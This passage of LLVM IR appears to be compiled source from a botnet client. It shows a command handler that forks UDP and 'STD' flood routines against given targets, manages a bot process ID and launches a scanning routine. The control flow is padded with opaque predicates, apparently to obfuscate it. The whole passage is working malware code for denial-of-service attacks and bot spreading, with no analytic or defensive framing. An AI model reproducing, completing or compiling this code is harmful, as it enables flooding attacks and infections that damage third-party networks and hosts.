  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %39, i8* bitcast ([36 x i8*]* @sendSTD.randstrings to i8*), i64 288, i32 16, i1 false)
  %40 = call i32 @rand() #3
  %41 = sext i32 %40 to i64
  %42 = urem i64 %41, 36
  %43 = getelementptr inbounds [36 x i8*], [36 x i8*]* %12, i64 0, i64 %42
  %44 = load i8*, i8** %43, align 8
  store i8* %44, i8** %13, align 8
  %45 = load i32, i32* %11, align 4
  %46 = icmp uge i32 %45, 50
  br i1 %46, label %47, label %80

; <label>:47:                                     ; preds = %38
  %48 = load i32, i32* %7, align 4
  %49 = load i8*, i8** %13, align 8
  %50 = call i64 @send(i32 %48, i8* %49, i64 69, i32 0)
  %51 = load i32, i32* %7, align 4
  %52 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %53 = call i32 @connect(i32 %51, %struct.sockaddr* %52, i32 16)
  %54 = call i64 @time(i64* null) #3
  %55 = load i64, i64* %8, align 8
  %56 = load i32, i32* %6, align 4
  %57 = sext i32 %56 to i64
  %58 = add nsw i64 %55, %57
  %59 = icmp sge i64 %54, %58
  br i1 %59, label %60, label %63

; <label>:60:                                     ; preds = %47
  %61 = load i32, i32* %7, align 4
  %62 = call i32 @close(i32 %61)
  call void @_exit(i32 0) #12
  unreachable

; <label>:63:                                     ; preds = %47
  %64 = load i32, i32* @x.91
  %65 = load i32, i32* @y.92
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %63
  store i32 0, i32* %11, align 4
  %72 = load i32, i32* @x.91
  %73 = load i32, i32* @y.92
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %80

; <label>:80:                                     ; preds = %originalBBpart2, %38
  %81 = load i32, i32* %11, align 4
  %82 = add i32 %81, 1
  store i32 %82, i32* %11, align 4
  br label %38
                                                  ; No predecessors!
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %63
  store i32 0, i32* %11, align 4
  br label %originalBB
}

; Function Attrs: noreturn
declare void @_exit(i32) #8

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %31 = load i8**, i8*** %4, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @strcmp(i8* %33, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.152, i32 0, i32 0)) #9
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %186, label %36

; <label>:36:                                     ; preds = %2
  %37 = load i32, i32* @x.93
  %38 = load i32, i32* @y.94
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %36
  %45 = load i8**, i8*** %4, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i64 1
  %47 = load i8*, i8** %46, align 8
  %48 = call i32 @strcmp(i8* %47, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.153, i32 0, i32 0)) #9
  %49 = icmp ne i32 %48, 0
  %50 = load i32, i32* @x.93
  %51 = load i32, i32* @y.94
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %49, label %81, label %58

; <label>:58:                                     ; preds = %originalBBpart2
  %59 = load i32, i32* @x.93
  %60 = load i32, i32* @y.94
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %58
  %67 = load i32, i32* @botnetPid, align 4
  %68 = icmp eq i32 %67, 0
  %69 = load i32, i32* @x.93
  %70 = load i32, i32* @y.94
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %68, label %77, label %78

; <label>:77:                                     ; preds = %originalBBpart24
  br label %1171

; <label>:78:                                     ; preds = %originalBBpart24
  %79 = load i32, i32* @botnetPid, align 4
  %80 = call i32 @kill(i32 %79, i32 9) #3
  store i32 0, i32* @botnetPid, align 4
  br label %81

; <label>:81:                                     ; preds = %78, %originalBBpart2
  %82 = load i8**, i8*** %4, align 8
  %83 = getelementptr inbounds i8*, i8** %82, i64 1
  %84 = load i8*, i8** %83, align 8
  %85 = call i32 @strcmp(i8* %84, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.154, i32 0, i32 0)) #9
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %169, label %87

; <label>:87:                                     ; preds = %81
  %88 = load i32, i32* @botnetPid, align 4
  %89 = icmp ne i32 %88, 0
  br i1 %89, label %90, label %107

; <label>:90:                                     ; preds = %87
  %91 = load i32, i32* @x.93
  %92 = load i32, i32* @y.94
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %90
  %99 = load i32, i32* @x.93
  %100 = load i32, i32* @y.94
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %1171

; <label>:107:                                    ; preds = %87
  %108 = call i32 @fork() #3
  store i32 %108, i32* %5, align 4
  store i32 1000, i32* %6, align 4
  store i32 10, i32* %7, align 4
  %109 = load i32, i32* %5, align 4
  %110 = icmp ugt i32 %109, 0
  br i1 %110, label %111, label %113

; <label>:111:                                    ; preds = %107
  %112 = load i32, i32* %5, align 4
  store i32 %112, i32* @botnetPid, align 4
  br label %1171

; <label>:113:                                    ; preds = %107
  %114 = load i32, i32* @x.93
  %115 = load i32, i32* @y.94
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %113
  %122 = load i32, i32* %5, align 4
  %123 = icmp eq i32 %122, -1
  %124 = load i32, i32* @x.93
  %125 = load i32, i32* @y.94
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %123, label %132, label %149

; <label>:132:                                    ; preds = %originalBBpart212
  %133 = load i32, i32* @x.93
  %134 = load i32, i32* @y.94
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %132
  %141 = load i32, i32* @x.93
  %142 = load i32, i32* @y.94
  %143 = sub i32 %141, 1
  %144 = mul i32 %141, %143
  %145 = urem i32 %144, 2
  %146 = icmp eq i32 %145, 0
  %147 = icmp slt i32 %142, 10
  %148 = or i1 %146, %147
  br i1 %148, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %1171

; <label>:149:                                    ; preds = %originalBBpart212
  br label %150

; <label>:150:                                    ; preds = %149
  %151 = load i32, i32* @x.93
  %152 = load i32, i32* @y.94
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %150
  %159 = load i32, i32* %7, align 4
  %160 = load i32, i32* %6, align 4
  call void @botnetTScan(i32 %159, i32 %160)
  call void @_exit(i32 0) #12
  %161 = load i32, i32* @x.93
  %162 = load i32, i32* @y.94
  %163 = sub i32 %161, 1
  %164 = mul i32 %161, %163
  %165 = urem i32 %164, 2
  %166 = icmp eq i32 %165, 0
  %167 = icmp slt i32 %162, 10
  %168 = or i1 %166, %167
  br i1 %168, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  unreachable

; <label>:169:                                    ; preds = %81
  %170 = load i32, i32* @x.93
  %171 = load i32, i32* @y.94
  %172 = sub i32 %170, 1
  %173 = mul i32 %170, %172
  %174 = urem i32 %173, 2
  %175 = icmp eq i32 %174, 0
  %176 = icmp slt i32 %171, 10
  %177 = or i1 %175, %176
  br i1 %177, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %169
  %178 = load i32, i32* @x.93
  %179 = load i32, i32* @y.94
  %180 = sub i32 %178, 1
  %181 = mul i32 %178, %180
  %182 = urem i32 %181, 2
  %183 = icmp eq i32 %182, 0
  %184 = icmp slt i32 %179, 10
  %185 = or i1 %183, %184
  br i1 %185, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %186

; <label>:186:                                    ; preds = %originalBBpart224, %2
  %187 = load i32, i32* @x.93
  %188 = load i32, i32* @y.94
  %189 = sub i32 %187, 1
  %190 = mul i32 %187, %189
  %191 = urem i32 %190, 2
  %192 = icmp eq i32 %191, 0
  %193 = icmp slt i32 %188, 10
  %194 = or i1 %192, %193
  br i1 %194, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %186
  %195 = load i8**, i8*** %4, align 8
  %196 = getelementptr inbounds i8*, i8** %195, i64 0
  %197 = load i8*, i8** %196, align 8
  %198 = call i32 @strcmp(i8* %197, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.155, i32 0, i32 0)) #9
  %199 = icmp ne i32 %198, 0
  %200 = load i32, i32* @x.93
  %201 = load i32, i32* @y.94
  %202 = sub i32 %200, 1
  %203 = mul i32 %200, %202
  %204 = urem i32 %203, 2
  %205 = icmp eq i32 %204, 0
  %206 = icmp slt i32 %201, 10
  %207 = or i1 %205, %206
  br i1 %207, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %199, label %479, label %208

; <label>:208:                                    ; preds = %originalBBpart228
  %209 = load i32, i32* %3, align 4
  %210 = icmp slt i32 %209, 6
  br i1 %210, label %294, label %211

; <label>:211:                                    ; preds = %208
  %212 = load i8**, i8*** %4, align 8
  %213 = getelementptr inbounds i8*, i8** %212, i64 3
  %214 = load i8*, i8** %213, align 8
  %215 = call i32 @atoi(i8* %214) #9
  %216 = icmp eq i32 %215, -1
  br i1 %216, label %294, label %217

; <label>:217:                                    ; preds = %211
  %218 = load i32, i32* @x.93
  %219 = load i32, i32* @y.94
  %220 = sub i32 %218, 1
  %221 = mul i32 %218, %220
  %222 = urem i32 %221, 2
  %223 = icmp eq i32 %222, 0
  %224 = icmp slt i32 %219, 10
  %225 = or i1 %223, %224
  br i1 %225, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %217
  %226 = load i8**, i8*** %4, align 8
  %227 = getelementptr inbounds i8*, i8** %226, i64 2
  %228 = load i8*, i8** %227, align 8
  %229 = call i32 @atoi(i8* %228) #9
  %230 = icmp eq i32 %229, -1
  %231 = load i32, i32* @x.93
  %232 = load i32, i32* @y.94
  %233 = sub i32 %231, 1
  %234 = mul i32 %231, %233
  %235 = urem i32 %234, 2
  %236 = icmp eq i32 %235, 0
  %237 = icmp slt i32 %232, 10
  %238 = or i1 %236, %237
  br i1 %238, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %230, label %294, label %239

; <label>:239:                                    ; preds = %originalBBpart232
  %240 = load i8**, i8*** %4, align 8
  %241 = getelementptr inbounds i8*, i8** %240, i64 4
  %242 = load i8*, i8** %241, align 8
  %243 = call i32 @atoi(i8* %242) #9
  %244 = icmp eq i32 %243, -1
  br i1 %244, label %294, label %245

; <label>:245:                                    ; preds = %239
  %246 = load i8**, i8*** %4, align 8
  %247 = getelementptr inbounds i8*, i8** %246, i64 5
  %248 = load i8*, i8** %247, align 8
  %249 = call i32 @atoi(i8* %248) #9
  %250 = icmp eq i32 %249, -1
  br i1 %250, label %294, label %251

; <label>:251:                                    ; preds = %245
  %252 = load i8**, i8*** %4, align 8
  %253 = getelementptr inbounds i8*, i8** %252, i64 5
  %254 = load i8*, i8** %253, align 8
  %255 = call i32 @atoi(i8* %254) #9
  %256 = icmp sgt i32 %255, 65536
  br i1 %256, label %294, label %257

; <label>:257:                                    ; preds = %251
  %258 = load i8**, i8*** %4, align 8
  %259 = getelementptr inbounds i8*, i8** %258, i64 5
  %260 = load i8*, i8** %259, align 8
  %261 = call i32 @atoi(i8* %260) #9
  %262 = icmp sgt i32 %261, 65500
  br i1 %262, label %294, label %263

; <label>:263:                                    ; preds = %257
  %264 = load i8**, i8*** %4, align 8
  %265 = getelementptr inbounds i8*, i8** %264, i64 4
  %266 = load i8*, i8** %265, align 8
  %267 = call i32 @atoi(i8* %266) #9
  %268 = icmp sgt i32 %267, 32
  br i1 %268, label %294, label %269

; <label>:269:                                    ; preds = %263
  %270 = load i32, i32* @x.93
  %271 = load i32, i32* @y.94
  %272 = sub i32 %270, 1
  %273 = mul i32 %270, %272
  %274 = urem i32 %273, 2
  %275 = icmp eq i32 %274, 0
  %276 = icmp slt i32 %271, 10
  %277 = or i1 %275, %276
  br i1 %277, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %269
  %278 = load i32, i32* %3, align 4
  %279 = icmp eq i32 %278, 7
  %280 = load i32, i32* @x.93
  %281 = load i32, i32* @y.94
  %282 = sub i32 %280, 1
  %283 = mul i32 %280, %282
  %284 = urem i32 %283, 2
  %285 = icmp eq i32 %284, 0
  %286 = icmp slt i32 %281, 10
  %287 = or i1 %285, %286
  br i1 %287, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %279, label %288, label %295

; <label>:288:                                    ; preds = %originalBBpart236
  %289 = load i8**, i8*** %4, align 8
  %290 = getelementptr inbounds i8*, i8** %289, i64 6
  %291 = load i8*, i8** %290, align 8
  %292 = call i32 @atoi(i8* %291) #9
  %293 = icmp slt i32 %292, 1
  br i1 %293, label %294, label %295

; <label>:294:                                    ; preds = %288, %263, %257, %251, %245, %239, %originalBBpart232, %211, %208
  br label %1171

; <label>:295:                                    ; preds = %288, %originalBBpart236
  %296 = load i8**, i8*** %4, align 8
  %297 = getelementptr inbounds i8*, i8** %296, i64 1
  %298 = load i8*, i8** %297, align 8
  store i8* %298, i8** %8, align 8
  %299 = load i8**, i8*** %4, align 8
  %300 = getelementptr inbounds i8*, i8** %299, i64 2
  %301 = load i8*, i8** %300, align 8
  %302 = call i32 @atoi(i8* %301) #9
  store i32 %302, i32* %9, align 4
  %303 = load i8**, i8*** %4, align 8
  %304 = getelementptr inbounds i8*, i8** %303, i64 3
  %305 = load i8*, i8** %304, align 8
  %306 = call i32 @atoi(i8* %305) #9
  store i32 %306, i32* %10, align 4
  %307 = load i8**, i8*** %4, align 8
  %308 = getelementptr inbounds i8*, i8** %307, i64 4
  %309 = load i8*, i8** %308, align 8
  %310 = call i32 @atoi(i8* %309) #9
  store i32 %310, i32* %11, align 4
  %311 = load i8**, i8*** %4, align 8
  %312 = getelementptr inbounds i8*, i8** %311, i64 5
  %313 = load i8*, i8** %312, align 8
  %314 = call i32 @atoi(i8* %313) #9
  store i32 %314, i32* %12, align 4
  %315 = load i32, i32* %3, align 4
  %316 = icmp sgt i32 %315, 6
  br i1 %316, label %317, label %338

; <label>:317:                                    ; preds = %295
  %318 = load i32, i32* @x.93
  %319 = load i32, i32* @y.94
  %320 = sub i32 %318, 1
  %321 = mul i32 %318, %320
  %322 = urem i32 %321, 2
  %323 = icmp eq i32 %322, 0
  %324 = icmp slt i32 %319, 10
  %325 = or i1 %323, %324
  br i1 %325, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %317
  %326 = load i8**, i8*** %4, align 8
  %327 = getelementptr inbounds i8*, i8** %326, i64 6
  %328 = load i8*, i8** %327, align 8
  %329 = call i32 @atoi(i8* %328) #9
  %330 = load i32, i32* @x.93
  %331 = load i32, i32* @y.94
  %332 = sub i32 %330, 1
  %333 = mul i32 %330, %332
  %334 = urem i32 %333, 2
  %335 = icmp eq i32 %334, 0
  %336 = icmp slt i32 %331, 10
  %337 = or i1 %335, %336
  br i1 %337, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br label %339

; <label>:338:                                    ; preds = %295
  br label %339

; <label>:339:                                    ; preds = %338, %originalBBpart240
  %340 = phi i32 [ %329, %originalBBpart240 ], [ 1000, %338 ]
  store i32 %340, i32* %13, align 4
  %341 = load i32, i32* %3, align 4
  %342 = icmp sgt i32 %341, 7
  br i1 %342, label %343, label %364

; <label>:343:                                    ; preds = %339
  %344 = load i32, i32* @x.93
  %345 = load i32, i32* @y.94
  %346 = sub i32 %344, 1
  %347 = mul i32 %344, %346
  %348 = urem i32 %347, 2
  %349 = icmp eq i32 %348, 0
  %350 = icmp slt i32 %345, 10
  %351 = or i1 %349, %350
  br i1 %351, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %343
  %352 = load i8**, i8*** %4, align 8
  %353 = getelementptr inbounds i8*, i8** %352, i64 7
  %354 = load i8*, i8** %353, align 8
  %355 = call i32 @atoi(i8* %354) #9
  %356 = load i32, i32* @x.93
  %357 = load i32, i32* @y.94
  %358 = sub i32 %356, 1
  %359 = mul i32 %356, %358
  %360 = urem i32 %359, 2
  %361 = icmp eq i32 %360, 0
  %362 = icmp slt i32 %357, 10
  %363 = or i1 %361, %362
  br i1 %363, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %365

; <label>:364:                                    ; preds = %339
  br label %365

; <label>:365:                                    ; preds = %364, %originalBBpart244
  %366 = phi i32 [ %355, %originalBBpart244 ], [ 1000000, %364 ]
  store i32 %366, i32* %14, align 4
  %367 = load i32, i32* %3, align 4
  %368 = icmp sgt i32 %367, 8
  br i1 %368, label %369, label %374

; <label>:369:                                    ; preds = %365
  %370 = load i8**, i8*** %4, align 8
  %371 = getelementptr inbounds i8*, i8** %370, i64 8
  %372 = load i8*, i8** %371, align 8
  %373 = call i32 @atoi(i8* %372) #9
  br label %391

; <label>:374:                                    ; preds = %365
  %375 = load i32, i32* @x.93
  %376 = load i32, i32* @y.94
  %377 = sub i32 %375, 1
  %378 = mul i32 %375, %377
  %379 = urem i32 %378, 2
  %380 = icmp eq i32 %379, 0
  %381 = icmp slt i32 %376, 10
  %382 = or i1 %380, %381
  br i1 %382, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %374
  %383 = load i32, i32* @x.93
  %384 = load i32, i32* @y.94
  %385 = sub i32 %383, 1
  %386 = mul i32 %383, %385
  %387 = urem i32 %386, 2
  %388 = icmp eq i32 %387, 0
  %389 = icmp slt i32 %384, 10
  %390 = or i1 %388, %389
  br i1 %390, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br label %391

; <label>:391:                                    ; preds = %originalBBpart248, %369
  %392 = phi i32 [ %373, %369 ], [ 0, %originalBBpart248 ]
  store i32 %392, i32* %15, align 4
  %393 = load i8*, i8** %8, align 8
  %394 = call i8* @strstr(i8* %393, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #9
  %395 = icmp ne i8* %394, null
  br i1 %395, label %396, label %449

; <label>:396:                                    ; preds = %391
  %397 = load i8*, i8** %8, align 8
  %398 = call i8* @strtok(i8* %397, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #3
  store i8* %398, i8** %16, align 8
  br label %399

; <label>:399:                                    ; preds = %originalBBpart256, %396
  %400 = load i8*, i8** %16, align 8
  %401 = icmp ne i8* %400, null
  br i1 %401, label %402, label %448

; <label>:402:                                    ; preds = %399
  %403 = load i32, i32* @x.93
  %404 = load i32, i32* @y.94
  %405 = sub i32 %403, 1
  %406 = mul i32 %403, %405
  %407 = urem i32 %406, 2
  %408 = icmp eq i32 %407, 0
  %409 = icmp slt i32 %404, 10
  %410 = or i1 %408, %409
  br i1 %410, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %402
  %411 = call i32 @listFork()
  %412 = icmp ne i32 %411, 0
  %413 = load i32, i32* @x.93
  %414 = load i32, i32* @y.94
  %415 = sub i32 %413, 1
  %416 = mul i32 %413, %415
  %417 = urem i32 %416, 2
  %418 = icmp eq i32 %417, 0
  %419 = icmp slt i32 %414, 10
  %420 = or i1 %418, %419
  br i1 %420, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %412, label %430, label %421

; <label>:421:                                    ; preds = %originalBBpart252
  %422 = load i8*, i8** %16, align 8
  %423 = load i32, i32* %9, align 4
  %424 = load i32, i32* %10, align 4
  %425 = load i32, i32* %11, align 4
  %426 = load i32, i32* %12, align 4
  %427 = load i32, i32* %13, align 4
  %428 = load i32, i32* %14, align 4
  %429 = load i32, i32* %15, align 4
  call void @sendUDP(i8* %422, i32 %423, i32 %424, i32 %425, i32 %426, i32 %427, i32 %428, i32 %429)
  call void @_exit(i32 0) #12
  unreachable

; <label>:430:                                    ; preds = %originalBBpart252
  %431 = load i32, i32* @x.93
  %432 = load i32, i32* @y.94
  %433 = sub i32 %431, 1
  %434 = mul i32 %431, %433
  %435 = urem i32 %434, 2
  %436 = icmp eq i32 %435, 0
  %437 = icmp slt i32 %432, 10
  %438 = or i1 %436, %437
  br i1 %438, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %430
  %439 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #3
  store i8* %439, i8** %16, align 8
  %440 = load i32, i32* @x.93
  %441 = load i32, i32* @y.94
  %442 = sub i32 %440, 1
  %443 = mul i32 %440, %442
  %444 = urem i32 %443, 2
  %445 = icmp eq i32 %444, 0
  %446 = icmp slt i32 %441, 10
  %447 = or i1 %445, %446
  br i1 %447, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br label %399

; <label>:448:                                    ; preds = %399
  br label %478

; <label>:449:                                    ; preds = %391
  %450 = load i32, i32* @x.93
  %451 = load i32, i32* @y.94
  %452 = sub i32 %450, 1
  %453 = mul i32 %450, %452
  %454 = urem i32 %453, 2
  %455 = icmp eq i32 %454, 0
  %456 = icmp slt i32 %451, 10
  %457 = or i1 %455, %456
  br i1 %457, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %449
  %458 = call i32 @listFork()
  %459 = icmp ne i32 %458, 0
  %460 = load i32, i32* @x.93
  %461 = load i32, i32* @y.94
  %462 = sub i32 %460, 1
  %463 = mul i32 %460, %462
  %464 = urem i32 %463, 2
  %465 = icmp eq i32 %464, 0
  %466 = icmp slt i32 %461, 10
  %467 = or i1 %465, %466
  br i1 %467, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br i1 %459, label %477, label %468

; <label>:468:                                    ; preds = %originalBBpart260
  %469 = load i8*, i8** %8, align 8
  %470 = load i32, i32* %9, align 4
  %471 = load i32, i32* %10, align 4
  %472 = load i32, i32* %11, align 4
  %473 = load i32, i32* %12, align 4
  %474 = load i32, i32* %13, align 4
  %475 = load i32, i32* %14, align 4
  %476 = load i32, i32* %15, align 4
  call void @sendUDP(i8* %469, i32 %470, i32 %471, i32 %472, i32 %473, i32 %474, i32 %475, i32 %476)
  call void @_exit(i32 0) #12
  unreachable

; <label>:477:                                    ; preds = %originalBBpart260
  br label %478

; <label>:478:                                    ; preds = %477, %448
  br label %1171

; <label>:479:                                    ; preds = %originalBBpart228
  %480 = load i32, i32* @x.93
  %481 = load i32, i32* @y.94
  %482 = sub i32 %480, 1
  %483 = mul i32 %480, %482
  %484 = urem i32 %483, 2
  %485 = icmp eq i32 %484, 0
  %486 = icmp slt i32 %481, 10
  %487 = or i1 %485, %486
  br i1 %487, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %479
  %488 = load i8**, i8*** %4, align 8
  %489 = getelementptr inbounds i8*, i8** %488, i64 0
  %490 = load i8*, i8** %489, align 8
  %491 = call i32 @strcmp(i8* %490, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.156, i32 0, i32 0)) #9
  %492 = icmp ne i32 %491, 0
  %493 = load i32, i32* @x.93
  %494 = load i32, i32* @y.94
  %495 = sub i32 %493, 1
  %496 = mul i32 %493, %495
  %497 = urem i32 %496, 2
  %498 = icmp eq i32 %497, 0
  %499 = icmp slt i32 %494, 10
  %500 = or i1 %498, %499
  br i1 %500, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %492, label %782, label %501

; <label>:501:                                    ; preds = %originalBBpart264
  %502 = load i32, i32* @x.93
  %503 = load i32, i32* @y.94
  %504 = sub i32 %502, 1
  %505 = mul i32 %502, %504
  %506 = urem i32 %505, 2
  %507 = icmp eq i32 %506, 0
  %508 = icmp slt i32 %503, 10
  %509 = or i1 %507, %508
  br i1 %509, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %501
  %510 = load i32, i32* %3, align 4
  %511 = icmp slt i32 %510, 6
  %512 = load i32, i32* @x.93
  %513 = load i32, i32* @y.94
  %514 = sub i32 %512, 1
  %515 = mul i32 %512, %514
  %516 = urem i32 %515, 2
  %517 = icmp eq i32 %516, 0
  %518 = icmp slt i32 %513, 10
  %519 = or i1 %517, %518
  br i1 %519, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %511, label %594, label %520

; <label>:520:                                    ; preds = %originalBBpart268
  %521 = load i8**, i8*** %4, align 8
  %522 = getelementptr inbounds i8*, i8** %521, i64 3
  %523 = load i8*, i8** %522, align 8
  %524 = call i32 @atoi(i8* %523) #9
  %525 = icmp eq i32 %524, -1
  br i1 %525, label %594, label %526

; <label>:526:                                    ; preds = %520
  %527 = load i8**, i8*** %4, align 8
  %528 = getelementptr inbounds i8*, i8** %527, i64 2
  %529 = load i8*, i8** %528, align 8
  %530 = call i32 @atoi(i8* %529) #9
  %531 = icmp eq i32 %530, -1
  br i1 %531, label %594, label %532

; <label>:532:                                    ; preds = %526
  %533 = load i8**, i8*** %4, align 8
  %534 = getelementptr inbounds i8*, i8** %533, i64 4
  %535 = load i8*, i8** %534, align 8
  %536 = call i32 @atoi(i8* %535) #9
  %537 = icmp eq i32 %536, -1
  br i1 %537, label %594, label %538

; <label>:538:                                    ; preds = %532
  %539 = load i8**, i8*** %4, align 8
  %540 = getelementptr inbounds i8*, i8** %539, i64 4
  %541 = load i8*, i8** %540, align 8
  %542 = call i32 @atoi(i8* %541) #9
  %543 = icmp sgt i32 %542, 32
